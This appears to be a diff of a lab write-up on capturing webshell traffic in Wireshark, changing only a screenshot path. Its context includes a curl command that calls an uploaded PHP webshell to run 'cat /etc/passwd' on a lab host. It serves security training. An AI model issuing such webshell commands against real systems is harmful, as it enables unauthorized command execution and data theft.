@@ -8,7 +8,7 @@ Wireshark Capture of traditional webshellTarget pippin with a traditional webshe
 
 ## Deliverable 1. Provide a screenshot that shows the relevant tcp stream similar to the one below. Create a capture filter on port 80 when you do so.
 
-![image-20221105205902211](./images/image-20221105205902211-1667696347658-1.png)
+![image-20221105231720500](./images/1.png)
 
 `curl 'http://10.0.5.25/upload/navarro.php?cmd=cat+/etc/passwd'`
 
